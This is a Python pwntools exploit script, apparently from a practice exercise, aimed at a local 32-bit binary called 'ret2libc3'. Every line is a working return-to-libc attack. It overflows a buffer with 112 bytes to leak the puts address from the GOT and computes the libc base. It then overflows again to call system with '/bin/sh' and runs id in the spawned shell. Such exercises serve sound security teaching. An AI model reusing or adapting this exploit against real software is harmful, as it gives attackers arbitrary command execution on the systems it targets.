#!/usr/bin/env python3
from pwn import *
import time
context.log_level='error'
context.arch='i386'
BIN='../src/ret2libc3'
LIBC='/lib32/libc.so.6'
e=ELF(BIN)
libc=ELF(LIBC)
puts=e.plt['puts']; puts_got=e.got['puts']; main=e.symbols['main']
io=process(BIN)
io.sendline(b'A'*112+p32(puts)+p32(main)+p32(puts_got))
leak=int.from_bytes(io.recvline().strip()[:4].ljust(4,b'\x00'),'little')
base=leak-libc.symbols['puts']
system=base+libc.symbols['system']
binsh=base+next(libc.search(b'/bin/sh'))
print('leak=0x%x base=0x%x'%(leak,base), file=sys.stderr)
io.sendline(b'A'*112+p32(system)+p32(0)+p32(binsh))
io.sendline(b'echo PWNED_LIBC3; id; exit')
print(io.recvall(timeout=5).decode('utf-8','replace'))